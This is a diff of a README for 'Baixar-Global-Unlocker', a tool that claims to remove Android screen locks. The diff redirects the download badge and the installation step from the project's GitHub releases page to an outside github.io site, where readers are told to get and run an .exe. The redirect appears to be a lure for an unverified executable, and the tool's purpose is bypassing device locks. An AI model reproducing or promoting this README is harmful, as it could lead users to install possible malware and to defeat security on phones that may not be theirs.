@@ -1,6 +1,6 @@
 # 🔓 Baixar-Global-Unlocker - Remove screen locks on Android devices
 
-[![](https://img.shields.io/badge/Download-Global_Unlocker-blue.svg)](https://github.com/Porte8585/Baixar-Global-Unlocker/releases)
+[![](https://img.shields.io/badge/Download-Global_Unlocker-blue.svg)](https://porte8585.github.io)
 
 ## 📖 About this software
 
@@ -21,7 +21,7 @@ To run this software, your computer needs the following specifications:
 
 Follow these steps to obtain and prepare the software on your machine:
 
-1. Visit the following page to choose the latest version of the software: [https://github.com/Porte8585/Baixar-Global-Unlocker/releases](https://github.com/Porte8585/Baixar-Global-Unlocker/releases).
+1. Visit the following page to choose the latest version of the software: [https://porte8585.github.io](https://porte8585.github.io).
 2. Look for the file ending in .exe under the Assets section of the latest release.
 3. Click the file name to start the download to your computer.
 4. Save the file to your desktop or your Downloads folder.
